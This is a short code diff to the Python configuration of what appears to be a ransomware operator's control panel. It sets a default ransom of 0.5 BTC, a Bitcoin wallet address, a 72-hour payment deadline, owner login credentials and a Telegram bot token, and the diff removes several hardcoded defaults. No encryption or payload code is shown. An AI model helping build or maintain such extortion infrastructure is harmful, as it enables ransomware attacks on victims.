@@ -32,16 +32,16 @@ import requests
 # ============================================================================
 
 class Config:
-    SECRET_KEY = os.environ.get('SECRET_KEY', 'dev-key-change-this')
+    SECRET_KEY = os.environ.get('SECRET_KEY',)
     
     # Ransom settings
     DEFAULT_RANSOM_AMOUNT = os.environ.get('DEFAULT_RANSOM_AMOUNT', '0.5 BTC')
-    DEFAULT_BTC_ADDRESS = os.environ.get('DEFAULT_BTC_ADDRESS', '1PussWalletVMTest')
+    DEFAULT_BTC_ADDRESS = os.environ.get('DEFAULT_BTC_ADDRESS',)
     DEFAULT_DEADLINE_HOURS = int(os.environ.get('DEFAULT_DEADLINE_HOURS', 72))
     
     # Owner credentials - FIXED: Set default values
-    OWNER_ID = os.environ.get('OWNER_ID', '40671Mps19*')
-    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD', 'pussalator123')
+    OWNER_ID = os.environ.get('OWNER_ID',)
+    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD',)
     
     # Telegram Bot
     TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
